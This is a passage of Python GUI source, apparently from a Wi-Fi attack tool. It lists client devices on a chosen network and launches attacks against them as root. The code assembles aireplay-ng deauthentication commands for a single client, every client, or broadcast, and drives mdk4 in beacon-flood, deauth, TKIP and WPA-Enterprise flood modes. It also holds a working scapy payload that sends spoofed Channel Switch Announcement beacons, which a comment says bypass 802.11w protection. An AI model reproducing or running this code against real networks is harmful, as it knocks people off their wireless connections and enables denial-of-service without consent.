                if len(parts) < 2:
                    continue
                mac = parts[0].strip().upper()
                name = parts[1].strip()
                if not mac or not re.match(r"^[0-9A-F:]{17}$", mac):
                    continue
                if name:
                    self._mac_names[mac] = name
                    found += 1
            self.output.append(
                "# hostname resolve done -- named %d MAC(s)\n" % found)
            # Re-render the station list so the freshly-resolved names
            # appear.
            self._render_stations()

        self._resolve_proc = Process(
            ["bash", "-c", script], on_line, on_done, root=True,
        )
        self._resolve_proc.start()

    def _render_stations(self) -> None:
        # Update the station rows in the target group. Keep the header row
        # (self._empty_target) at the top and only replace the station
        # children.
        for r in self._station_rows:
            self.target_group.remove(r)
        self._station_rows = []
        if not self._stations:
            self._empty_target.set_subtitle(
                "(no clients seen yet -- try scanning longer)")
            return
        essid = (self._selected_ap or {}).get("essid") or "(hidden)"
        self._empty_target.set_subtitle(
            "%s clients on %s" % (len(self._stations), essid))
        for st in self._stations:
            self._add_station_row(st)

    def _add_station_row(self, st: dict) -> None:
        mac = st["mac"]
        try:
            power = int(st.get("power") or "-100")
        except ValueError:
            power = -100
        # Prefer friendly name in the title, fall through to a plain
        # "unknown" label. Either way the MAC always ends up in the
        # subtitle so the user can copy it, and so identical unknowns
        # can be told apart. Randomised MACs (locally-administered bit
        # set) are marked "randomised" instead of "unknown" -- those
        # are unresolvable by design on modern iOS/Android.
        name = self._mac_names.get(mac.upper())
        if name:
            title = name
        else:
            # Second hex nibble of the first octet: bit 1 (0x02) = LAA.
            try:
                first = int(mac.split(":", 1)[0], 16)
                title = "randomised" if (first & 0x02) else "unknown"
            except ValueError:
                title = "unknown"
        subtitle = "%s -- %s dBm -- %s packets" % (
            mac, power, st.get("packets", "0"))
        row = Adw.ActionRow(title=title, subtitle=subtitle)
        # Radio button feel: highlight the picked one.
        pick_btn = Gtk.Button(label="Target", valign=Gtk.Align.CENTER)
        pick_btn.connect(
            "clicked", lambda _b, m=mac: self._set_target_station(m))
        if self._target_station == mac:
            pick_btn.add_css_class("suggested-action")
            row.add_prefix(Gtk.Image.new_from_icon_name(
                "emblem-ok-symbolic"))
        row.add_suffix(pick_btn)
        self.target_group.add(row)
        self._station_rows.append(row)

    def _set_target_station(self, mac: str) -> None:
        self._target_station = mac
        self._render_stations()
        toast(self.app_window, "Target: " + mac)

    # ---------------------------------------------------------- attack
    def _start_attack(self) -> None:
        if self._selected_ap is None:
            toast(self.app_window, "Pick a target network first")
            return
        if self._attack_proc is not None and self._attack_proc.running:
            toast(self.app_window, "Attack already running")
            return

        mode = self.attack_mode.get_selected()
        count = int(self.attack_count.get_value())
        bssid = self._selected_ap["bssid"]
        chan = self._selected_ap.get("channel", "1")

        # Lock the interface to the AP's channel first -- aireplay
        # complains if the card is somewhere else, and airodump has been
        # hopping.
        self.output.append(
            "# locking %s to channel %s\n"
            % (self._monitor_iface, chan))

        if mode == 0:
            if not self._target_station:
                toast(self.app_window,
                      "Pick a client to target, or switch mode to "
                      "'All clients' / 'Broadcast'")
                return
            cmd = (
                "iw dev %s set channel %s 2>/dev/null; "
                "aireplay-ng --deauth %d -a %s -c %s %s"
                % (self._monitor_iface, chan, count, bssid,
                   self._target_station, self._monitor_iface)
            )
            label = "%s <- %s" % (self._target_station, bssid)
        elif mode == 1:
            # All clients: fire aireplay per station in a loop so each
            # gets its own burst pattern. `--ignore-negative-one` is set
            # because aireplay complains when the driver reports channel
            # -1 (which happens when the card is briefly hopping); it's
            # cosmetic.
            targets = " ".join(s["mac"] for s in self._stations)
            if not targets:
                toast(self.app_window,
                      "No clients discovered on this network yet")
                return
            cmd = (
                "iw dev %s set channel %s 2>/dev/null; "
                "for m in %s; do "
                "  echo \"[deauth] $m\"; "
                "  aireplay-ng --ignore-negative-one --deauth %d "
                "    -a %s -c $m %s; "
                "done"
                % (self._monitor_iface, chan, targets, count or 5,
                   bssid, self._monitor_iface)
            )
            label = "%d clients <- %s" % (len(self._stations), bssid)
        else:
            # Broadcast -- no -c, so aireplay sends to ff:ff:ff.
            cmd = (
                "iw dev %s set channel %s 2>/dev/null; "
                "aireplay-ng --ignore-negative-one --deauth %d -a %s %s"
                % (self._monitor_iface, chan, count, bssid,
                   self._monitor_iface)
            )
            label = "broadcast <- " + bssid

        self.output.append("$ %s\n[attack] %s\n" % (cmd, label))
        self._attack_proc = Process(
            ["sh", "-c", cmd], self.output.append,
            self._on_attack_done, root=True,
        )
        self._attack_proc.start()
        self.attack_btn.set_sensitive(False)
        self.attack_stop_btn.set_sensitive(True)

    def _on_attack_done(self, code: int) -> None:
        self._attack_proc = None
        self.output.append("[attack ended: code %d]\n" % code)
        self.attack_btn.set_sensitive(True)
        self.attack_stop_btn.set_sensitive(False)

    def _stop_attack(self) -> None:
        if self._attack_proc is not None:
            self.output.append("[stopping attack]\n")
            self._attack_proc.stop()

    # --------------------------------------------------------- utils
    def _run_sync(self, cmd: str) -> None:
        """Fire-and-forget shell call, root, timeout 5s. Used for cleanup."""
        run_async(["sh", "-c", cmd], lambda _r: None, root=True, timeout=5)

    # ------------------------------------------------------- mdk4
    def _start_mdk4(self) -> None:
        """Run mdk4 in whatever mode the combo says. Every mode takes
        a slightly different target argument shape, so we translate
        the free-form text field before assembling the argv."""
        if not self._monitor_iface:
            toast(self.app_window, "Enable monitor mode first")
            return
        if getattr(self, "_mdk4_proc", None) is not None:
            toast(self.app_window, "mdk4 already running")
            return
        idx = self.mdk4_mode.get_selected()
        # First char of the visible label is the actual mode letter.
        model = self.mdk4_mode.get_model()
        mode_letter = model.get_string(idx)[0] if model else "d"
        target = self.mdk4_target.get_text().strip()

        # Build argv per mode. Each mode has its own quirks:
        #   a: -a takes a *file* of MACs or a single BSSID
        #   b: -b takes SSID or list-file; -c hop; -w n
        #   d: -c channels (comma sep) OR -B target BSSID
        #   e: -t target BSSID (WPA-Enterprise flood)
        #   m: -t target BSSID (TKIP)
        #   p: -e SSID OR -c channels to brute
        #   w: -e target ESSID
        #   x: -c channel
        argv = ["mdk4", self._monitor_iface, mode_letter]
        if mode_letter in ("a",) and target:
            argv += ["-a", target]
        elif mode_letter == "b":
            if target:
                argv += ["-n", target]
            argv += ["-h"]  # HT beacon caps for realism
        elif mode_letter == "d" and target:
            argv += ["-B", target]
        elif mode_letter in ("e", "m") and target:
            argv += ["-t", target]
        elif mode_letter == "p":
            if target:
                argv += ["-e", target]
        elif mode_letter == "w" and target:
            argv += ["-e", target]

        self.output.append("$ " + " ".join(argv) + "\n")
        self._mdk4_proc = Process(
            argv, self.output.append,
            self._on_mdk4_done, root=True)
        self._mdk4_proc.start()
        self.mdk4_btn.set_sensitive(False)
        self.mdk4_stop_btn.set_sensitive(True)

    def _stop_mdk4(self) -> None:
        proc = getattr(self, "_mdk4_proc", None)
        if proc is not None:
            proc.stop()

    def _on_mdk4_done(self, code: int) -> None:
        self.output.append("[mdk4 exited: %d]\n" % code)
        self._mdk4_proc = None
        self.mdk4_btn.set_sensitive(True)
        self.mdk4_stop_btn.set_sensitive(False)

    # ------------------------------------------------------- CSA
    def _fire_csa(self) -> None:
        """Fire a burst of spoofed beacons with a CSA IE that tells
        every station of the target BSSID to jump to another channel.

        Works even against APs / clients with PMF (802.11w) required
        because CSA lives in a beacon and beacons are not protected.
        We send N spoofed beacons and quit -- no need for a long-lived
        subprocess.
        """
        if not self._monitor_iface:
            toast(self.app_window, "Enable monitor mode first")
            return
        bssid = self.csa_bssid.get_text().strip()
        if not bssid:
            toast(self.app_window, "Set the target BSSID first")
            return
        new_ch = int(self.csa_new_channel.get_value())
        count = int(self.csa_count.get_value())

        # Scapy one-liner. Uses Dot11 + Dot11Beacon + Dot11Elt(CSA)
        # with a count-down of 3 beacons so the client jumps
        # deterministically. Loop N times so a bursty medium doesn't
        # eat the whole train.
        script = (
            "python3 - <<'PY'\n"
            "import sys\n"
            "from scapy.all import RadioTap, Dot11, Dot11Beacon, "
            "Dot11Elt, sendp\n"
            "iface = %r\n"
            "bssid = %r\n"
            "new_ch = %d\n"
            "count = %d\n"
            "pkt = (RadioTap()/\n"
            "  Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',\n"
            "        addr2=bssid, addr3=bssid)/\n"
            "  Dot11Beacon(cap=0x1104)/\n"
            "  Dot11Elt(ID='SSID', info='')/\n"
            "  Dot11Elt(ID='DSset', info=bytes([new_ch]))/\n"
            "  Dot11Elt(ID=37, info=bytes([0, new_ch, 3])))\n"
            "sendp(pkt, iface=iface, count=count, inter=0.02, "
            "verbose=False)\n"
            "print('sent', count, 'CSA beacons to', bssid,\n"
            "      'jumping to ch', new_ch)\n"
            "PY\n"
        ) % (self._monitor_iface, bssid, new_ch, count)

        self.output.append("# firing CSA against %s → ch %d "
                            "(%d beacons)\n" % (bssid, new_ch, count))

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)

        run_async(["sh", "-c", script], done,
                  root=True, timeout=20)
